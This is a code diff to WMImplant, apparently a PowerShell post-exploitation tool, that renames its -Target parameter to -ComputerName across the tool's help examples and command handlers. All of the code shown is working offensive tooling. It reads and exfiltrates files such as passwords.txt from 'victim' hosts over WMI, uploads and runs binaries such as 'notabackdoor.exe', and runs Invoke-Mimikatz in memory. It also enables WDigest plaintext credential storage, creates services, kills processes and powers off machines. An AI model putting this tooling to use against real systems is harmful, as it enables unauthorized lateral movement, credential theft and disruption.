-                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $Target
+                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $ComputerName
             }
         }
     }
@@ -1686,7 +1686,7 @@ function Invoke-WMImplant
     .PARAMETER RemoteExtension
     This parameter is used when you need to specify a file extension to search for on a remove machine.
 
-    .PARAMETER Target
+    .PARAMETER ComputerName
     This parameter specifies the system to execute the WMImplant command on.
 
     .PARAMETER Function
@@ -1821,83 +1821,83 @@ function Invoke-WMImplant
     This will list all available commands supported within WMImplant.
 
     .EXAMPLE
-    > Invoke-WMImplant -Cat -RemoteUser Chris -RemotePass Pass123 -RemoteFile C:\Users\Chris\Desktop\secrets.txt -Target windowspc
+    > Invoke-WMImplant -Cat -RemoteUser Chris -RemotePass Pass123 -RemoteFile C:\Users\Chris\Desktop\secrets.txt -ComputerName windowspc
     This command uses the "cat" command, and attempts to read the secrets.txt file with the provided username and password on the windowspc system
 
     .EXAMPLE
-    > Invoke-WMImplant -Cat -RemoteFile C:\Users\Chris\Desktop\pass.txt -Target windowspc
+    > Invoke-WMImplant -Cat -RemoteFile C:\Users\Chris\Desktop\pass.txt -ComputerName windowspc
     This command uses the "cat" command, and attempts to read the pass.txt file within the context of the current user on the windowspc system
 
     .EXAMPLE
-    > Invoke-WMImplant -Upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -Target securewindows
+    > Invoke-WMImplant -Upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -ComputerName securewindows
     This command uploads the C:\notavirus.exe file locally to the securewindows system at C:\Windows\TEMP\safe.exe and authenticates to the remote system with the Chris account and the target downloads it from local systme using the King account.
 
     .EXAMPLE
-    > Invoke-WMImplant -Download -RemoteFile C:\passwords.txt -LocalFile C:\Users\Chris\Downloads\passwords.txt -Target mysystem
+    > Invoke-WMImplant -Download -RemoteFile C:\passwords.txt -LocalFile C:\Users\Chris\Downloads\passwords.txt -ComputerName mysystem
     This command attempts to download the file C:\passwords.txt on the remote system "mysystem" locally to C:\Users\Chris\Downloads\passwords.txt.  It authenticates to the remote machine (to download the file) using the current user's context, and then is downloaded localy.
     
     .EXAMPLE
-    > Invoke-WMImplant -LS -RemoteFile C:\Users\Chris\Downloads -Target win7computer
+    > Invoke-WMImplant -LS -RemoteFile C:\Users\Chris\Downloads -ComputerName win7computer
     This command will get a directory list of all files within C:\Users\Chris\Downloads on the "win7computer" system under the current user's context.
 
     .EXAMPLE
-    > Invoke-WMImplant -Search -RemoteFile password.txt -Drive C: -Target chrispc -RemoteUser homedomain\Chris -RemotePass pass123
+    > Invoke-WMImplant -Search -RemoteFile password.txt -Drive C: -ComputerName chrispc -RemoteUser homedomain\Chris -RemotePass pass123
     This command searches the remote system "chrispc" for any file called password.txt on the C drive and authenticates using the credentials provided.
 
     .EXAMPLE
-    > Invoke-WMImplant -Search -RemoteExtension sql -Drive C: -Target computer2
+    > Invoke-WMImplant -Search -RemoteExtension sql -Drive C: -ComputerName computer2
     This command uses the current user's context to search the "computer2" system for any file on the C drive that has a "sql" file extension.
 
     .EXAMPLE
-    > Invoke-WMImplant -Remote_Posh -Location C:\test.ps1 -Function Invoke-Mimikatz -Target win7sys -RemoteUser test\admin -Pass admin123
+    > Invoke-WMImplant -Remote_Posh -Location C:\test.ps1 -Function Invoke-Mimikatz -ComputerName win7sys -RemoteUser test\admin -Pass admin123
     This command authenticates to the remote system using the provided admin account, downloads the test.ps1 script in memory and runs Invoke-Mimikatz, and returns the output to the local system over WMI.
     
     .EXAMPLE
-    > Invoke-WMImplant -PS -RemoteUser test\apple -RemotePass pass123 -Target hackerpc
+    > Invoke-WMImplant -PS -RemoteUser test\apple -RemotePass pass123 -ComputerName hackerpc
     This command gets a process listing on the system "hackerpc" by authenticating as the apple user
 
     .EXAMPLE
-    > Invoke-WMImplant -ProcessKill -ProcessID 1194 -Target sys3
+    > Invoke-WMImplant -ProcessKill -ProcessID 1194 -ComputerName sys3
     This command kills process id 1194 on the "sys3" system and authenticates with the current user's context
 
     .EXAMPLE
-    > Invoke-WMImplant -ProcessKill -ProcessName systemexplorer.exe -Target win7 -RemoteUser internal\admin -RemotePass pass123
+    > Invoke-WMImplant -ProcessKill -ProcessName systemexplorer.exe -ComputerName win7 -RemoteUser internal\admin -RemotePass pass123
     This command kills the remote process "systemexplorer.exe" on the system "win7" and authenticates as the "admin" user.
 
     .EXAMPLE
-    > Invoke-WMImplant -ProcessStart -RemoteFile notepad.exe -Target victimsys
+    > Invoke-WMImplant -ProcessStart -RemoteFile notepad.exe -ComputerName victimsys
     This command authenticates to the "victimsys" system under the current user's context and starts the process notepad.exe
 
     .EXAMPLE
-    > Invoke-WMImplant -ProcessStart -RemoteFile C:\notabackdoor.exe -Target victim2 -RemoteUser inside\goodadmin -RemotePass pass222
+    > Invoke-WMImplant -ProcessStart -RemoteFile C:\notabackdoor.exe -ComputerName victim2 -RemoteUser inside\goodadmin -RemotePass pass222
     This command authenticates to the "victim2" system as the user "goodadmin" and runs the binary located at C:\notabackdoor.exe
     
     .EXAMPLE
-    > Invoke-WMImplant -ActiveUsers -Target winadmin
+    > Invoke-WMImplant -ActiveUsers -ComputerName winadmin
     This command displays any user that has a process running on the "winadmin" system via the current user's context
 
     .EXAMPLE
-    > Invoke-WMImplant -VacantSystem -Target victim9 -RemoteUser owned\chris -RemotePass badpass
+    > Invoke-WMImplant -VacantSystem -ComputerName victim9 -RemoteUser owned\chris -RemotePass badpass
     This command attempts to determine if a user is active at the "victim9" system by searching for active screensavers and a logon prompt and authenticates as the user "chris"
     
     .EXAMPLE
-    > Invoke-WMImplant -DriveList -Target victim101
+    > Invoke-WMImplant -DriveList -ComputerName victim101
     This command authenticates to the victim101 system in the context of the current user and lists all drives connected to the system
 
     .EXAMPLE
-    > Invoke-WMImplant -Reboot -Target victom3
+    > Invoke-WMImplant -Reboot -ComputerName victom3
     This command reboots the "victom3" system
 
     .EXAMPLE
-    > Invoke-WMImplant -PowerOff -Target victim9 -RemoteUser domain\user -RemotePass pass123
+    > Invoke-WMImplant -PowerOff -ComputerName victim9 -RemoteUser domain\user -RemotePass pass123
     This command powers off the "victim9" and authenticates as the provided user and password.
     
     .EXAMPLE
-    > Invoke-WMImplant -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -Target win7user -RemoteUser test\chris -RemotePass pass123
+    > Invoke-WMImplant -KeyCreate -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest -RegValue "True" -ComputerName win7user -RemoteUser test\chris -RemotePass pass123
     This command authenticates to the win7user system using the provided credentials and creates the ChrisTest value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
 
     .EXAMPLE
-    > Invoke-WMImplant -KeyDelete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest2 -Target Win7user4
+    > Invoke-WMImplant -KeyDelete -Hive hklm -RegKey SOFTWARE\Microsoft\Windows\DWM -RegSubKey ChrisTest2 -ComputerName Win7user4
     This command authenticates as the current user to the win7user4 system and delete's the ChrisTest2 value located at HKLM:\SOFTWARE\Microsoft\Windows\DWM
     #>
 
@@ -1932,7 +1932,8 @@ function Invoke-WMImplant
         [Parameter(Mandatory = $False, ParameterSetName='File Search Extension')]
         [string]$RemoteExtension,
         [Parameter(Mandatory = $False, ValueFromPipeLine=$True)]
-        [string]$Target,
+        [Alias("Target")]
+        [string]$ComputerName,
         [Parameter(Mandatory = $False, ParameterSetName='Remote PowerShell')]
         [string]$Function,
         [Parameter(Mandatory = $False, ParameterSetName='Process Kill Name')]
@@ -2037,7 +2038,7 @@ function Invoke-WMImplant
 
         if($Cat)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2047,23 +2048,23 @@ function Invoke-WMImplant
                 Throw "You need to specify a file to read with the RemoteFile flag!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Get-FileContentsWMImplant -Creds $RemoteCredential -Target $Computer -File $RemoteFile
+                    Get-FileContentsWMImplant -Creds $RemoteCredential -ComputerName $Computer -File $RemoteFile
                 }
 
                 else
                 {
-                    Get-FileContentsWMImplant -Target $Computer -File $RemoteFile
+                    Get-FileContentsWMImplant -ComputerName $Computer -File $RemoteFile
                 }
             }
         }
 
         elseif($Download)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2078,23 +2079,23 @@ function Invoke-WMImplant
                 Throw "You need to specify the location to save the file with the $LocalFile flag!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -ComputerName $Computer
                 }
 
                 else
                 {
-                    Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -Target $Computer
+                    Invoke-FileTransferWMImplant -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -ComputerName $Computer
                 }
             }
         }
 
         elseif($LS)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2104,23 +2105,23 @@ function Invoke-WMImplant
                 Throw "Please provide the RemoteDirectory parameter to specify the directory to list!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-LSWMImplant -Creds $RemoteCredential -Target $Computer -Directory $RemoteDirectory
+                    Invoke-LSWMImplant -Creds $RemoteCredential -ComputerName $Computer -Directory $RemoteDirectory
                 }
 
                 else
                 {
-                    Invoke-LSWMImplant -Target $Computer -Directory $RemoteDirectory
+                    Invoke-LSWMImplant -ComputerName $Computer -Directory $RemoteDirectory
                 }
             }
         }
 
         elseif($Search)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2135,17 +2136,17 @@ function Invoke-WMImplant
                 Throw "Please provide the RemoteDrive parameter to specify the drive to search!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
                     if($RemoteFile)
                     {
-                        Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -Target $Computer -Drive $RemoteDrive
+                        Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -ComputerName $Computer -Drive $RemoteDrive
                     }
                     elseif($RemoteExtension)
                     {
-                        Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
+                        Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -ComputerName $Computer -Drive $RemoteDrive
                     }
                 }
 
@@ -2153,11 +2154,11 @@ function Invoke-WMImplant
                 {
                     if($RemoteFile)
                     {
-                        Find-FileWMImplant -File $RemoteFile -Target $Computer -Drive $RemoteDrive
+                        Find-FileWMImplant -File $RemoteFile -ComputerName $Computer -Drive $RemoteDrive
                     }
                     elseif($RemoteExtension)
                     {
-                        Find-FileWMImplant -Extension $RemoteExtension -Target $Computer -Drive $RemoteDrive
+                        Find-FileWMImplant -Extension $RemoteExtension -ComputerName $Computer -Drive $RemoteDrive
                     }
                 }
             }
@@ -2165,7 +2166,7 @@ function Invoke-WMImplant
 
         elseif($Upload)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2180,23 +2181,23 @@ function Invoke-WMImplant
                 Throw "Please use the RemoteFile flag to specify the full path to upload the file to!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
+                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -ComputerName $Computer
                 }
 
                 else
                 {
-                    Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
+                    Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -ComputerName $Computer
                 }
             }
         }
 
         elseif($CommandExec)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2206,107 +2207,107 @@ function Invoke-WMImplant
                 Throw "You need to specify the command to run with the -Command!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -Target $Computer
+                    Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -ComputerName $Computer
                 }
 
                 else
                 {
-                    Invoke-CommandExecution -Target $Computer -ExecCommand $RemoteCommand
+                    Invoke-CommandExecution -ComputerName $Computer -ExecCommand $RemoteCommand
                 }
             }
         }
 
         elseif($DisableWDigest)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Creds $RemoteCredential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                    Invoke-RegValueMod -Creds $RemoteCredential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $Computer
                 }
 
                 else
                 {
-                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $Computer
+                    Invoke-RegValueMod -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $Computer
                 }
             }
         }
 
         elseif($DisableWinRM)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
+                    Invoke-ProcSpawn -Creds $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                 }
 
                 else
                 {
-                    Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
+                    Invoke-ProcSpawn -ComputerName $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                 }
             }
         }
 
         elseif($EnableWdigest)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Creds $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -Target $Computer
+                    Invoke-RegValueMod -Creds $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -ComputerName $Computer
                 }
 
                 else
                 {
-                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -Target $Computer
+                    Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -ComputerName $Computer
                 }
             }
         }
 
         elseif($EnableWinRM)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
+                    Invoke-ProcSpawn -Creds $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                 }
 
                 else
                 {
-                    Invoke-ProcSpawn -Target $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
+                    Invoke-ProcSpawn -ComputerName $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                 }
             }
         }
 
         elseif($KeyCreate)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2331,22 +2332,22 @@ function Invoke-WMImplant
                 Throw "Please provide the registry value you are looking to modify!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
+                    Invoke-RegValueMod -ComputerName $Computer -Creds $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                 }
                 else
                 {
-                    Invoke-RegValueMod -Target $Computer -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
+                    Invoke-RegValueMod -ComputerName $Computer -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                 }
             }
         }
 
         elseif($KeyDelete)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2366,22 +2367,22 @@ function Invoke-WMImplant
                 Throw "Please provide the registry sub key you are looking to delete!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Target $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
+                    Invoke-RegValueMod -ComputerName $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                 }
                 else
                 {
-                    Invoke-RegValueMod -Target $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
+                    Invoke-RegValueMod -ComputerName $Computer -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                 }
             }
         }
 
         elseif($RemotePosh)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2396,23 +2397,23 @@ function Invoke-WMImplant
                 Throw "You need to specify the Function flag to provide the function to run on the remote system!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Location $Location -Function $Function -Target $Computer
+                    Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Location $Location -Function $Function -ComputerName $Computer
                 }
 
                 else
                 {
-                    Invoke-RemoteScriptWithOutput -Location $Location -Function $Function -Target $Computer
+                    Invoke-RemoteScriptWithOutput -Location $Location -Function $Function -ComputerName $Computer
                 }
             }
         }
 
         elseif($ServiceStart)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2422,22 +2423,22 @@ function Invoke-WMImplant
                 Throw "You need to specify the service name you want to start!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Start
+                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -Service $ServiceName -Start
                 }
                 else
                 {
-                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Start
+                    Invoke-ServiceMod -ComputerName $Computer -Service $ServiceName -Start
                 }
             }
         }
 
         elseif($ServiceStop)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2447,22 +2448,22 @@ function Invoke-WMImplant
                 Throw "You need to specify the service name you want to stop!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Stop
+                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -Service $ServiceName -Stop
                 }
                 else
                 {
-                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Stop
+                    Invoke-ServiceMod -ComputerName $Computer -Service $ServiceName -Stop
                 }
             }
         }
 
         elseif($ServiceDelete)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2472,22 +2473,22 @@ function Invoke-WMImplant
                 Throw "You need to specify the service name you want to delete!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -Service $ServiceName -Delete
+                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -Service $ServiceName -Delete
                 }
                 else
                 {
-                    Invoke-ServiceMod -Target $Computer -Service $ServiceName -Delete
+                    Invoke-ServiceMod -ComputerName $Computer -Service $ServiceName -Delete
                 }
             }
         }
 
         elseif($ServiceCreate)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2502,15 +2503,15 @@ function Invoke-WMImplant
                 Throw "You need to specify the path to the service binary for the service you are creating!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
+                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                 }
                 else
                 {
-                    Invoke-ServiceMod -Target $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
+                    Invoke-ServiceMod -ComputerName $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                 }
             }
         }
@@ -2518,49 +2519,49 @@ function Invoke-WMImplant
 
         elseif($SetWMIDefault)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Set-OriginalProperty -Creds $RemoteCredential -Target $Computer
+                    Set-OriginalProperty -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Set-OriginalProperty -Target $Computer
+                    Set-OriginalProperty -ComputerName $Computer
                 }
             }
         }
 
         elseif($PS)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Get-ProcessListingWMImplant -Creds $RemoteCredential -Target $Computer
+                    Get-ProcessListingWMImplant -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Get-ProcessListingWMImplant -Target $Computer
+                    Get-ProcessListingWMImplant -ComputerName $Computer
                 }
             }
         }
 
         elseif($ProcessKill)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2570,19 +2571,19 @@ function Invoke-WMImplant
                 Throw "Please provide the ProcessID or ProcessName flag to specify the process to kill!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
 
                 if($RemoteCredential)
                 {
                     if($ProcessName)
                     {
-                        Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -PName $ProcessName
+                        Invoke-ProcessPunisher -Creds $RemoteCredential -ComputerName $Computer -PName $ProcessName
                     }
 
                     elseif($ProcessID)
                     {
-                        Invoke-ProcessPunisher -Creds $RemoteCredential -Target $Computer -ProcId $ProcessID
+                        Invoke-ProcessPunisher -Creds $RemoteCredential -ComputerName $Computer -ProcId $ProcessID
                     }
                 }
 
@@ -2590,12 +2591,12 @@ function Invoke-WMImplant
                 {
                     if($ProcessName)
                     {
-                        Invoke-ProcessPunisher -Target $Computer -PName $ProcessName
+                        Invoke-ProcessPunisher -ComputerName $Computer -PName $ProcessName
                     }
 
                     elseif($ProcessID)
                     {
-                        Invoke-ProcessPunisher -Target $Computer -ProcId $ProcessID
+                        Invoke-ProcessPunisher -ComputerName $Computer -ProcId $ProcessID
                     }
                 }
             }
@@ -2603,7 +2604,7 @@ function Invoke-WMImplant
 
         elseif($ProcessStart)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
@@ -2613,165 +2614,165 @@ function Invoke-WMImplant
                 Throw "You need to specify the RemoteFile flag to provide a file/command to run!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ProcSpawn -Creds $RemoteCredential -Target $Computer -Command $RemoteFile
+                    Invoke-ProcSpawn -Creds $RemoteCredential -ComputerName $Computer -Command $RemoteFile
                 }
 
                 else
                 {
-                    Invoke-ProcSpawn -Target $Computer -Command $RemoteFile
+                    Invoke-ProcSpawn -ComputerName $Computer -Command $RemoteFile
                 }
             }
         }
 
         elseif($ActiveUsers)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Find-CurrentUsers -Creds $RemoteCredential -Target $Computer
+                    Find-CurrentUsers -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Find-CurrentUsers -Target $Computer
+                    Find-CurrentUsers -ComputerName $Computer
                 }
             }
         }
 
         elseif($BasicInfo)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Get-HostInfo -Creds $RemoteCredential -Target $Computer
+                    Get-HostInfo -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Get-HostInfo -Target $Computer
+                    Get-HostInfo -ComputerName $Computer
                 }
             }
         }
 
         elseif($DriveList)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Get-ComputerDrives -Creds $RemoteCredential -Target $Computer
+                    Get-ComputerDrives -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Get-ComputerDrives -Target $Computer
+                    Get-ComputerDrives -ComputerName $Computer
                 }
             }
         }
 
         elseif($IFConfig)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Get-NetworkCards -Creds $RemoteCredential -Target $Computer
+                    Get-NetworkCards -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Get-NetworkCards -Target $Computer
+                    Get-NetworkCards -ComputerName $Computer
                 }
             }
         }
 
         elseif($InstalledPrograms)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Get-InstalledPrograms -Creds $RemoteCredential -Target $Computer
+                    Get-InstalledPrograms -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Get-InstalledPrograms -Target $Computer
+                    Get-InstalledPrograms -ComputerName $Computer
                 }
             }
         }
 
         elseif($VacantSystem)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
                 if($RemoteCredential)
                 {
-                    Find-VacantComputer -Creds $RemoteCredential -Target $Computer
+                    Find-VacantComputer -Creds $RemoteCredential -ComputerName $Computer
                 }
 
                 else
                 {
-                    Find-VacantComputer -Target $Computer
+                    Find-VacantComputer -ComputerName $Computer
                 }
             }
         }
 
         elseif($LogonEvents)
         {
-            if(!$Target)
+            if(!$ComputerName)
             {
                 Throw "You need to specify a target to run the command against!"
             }
 
-            Foreach($Computer in $Target)
+            Foreach($Computer in $ComputerName)
             {
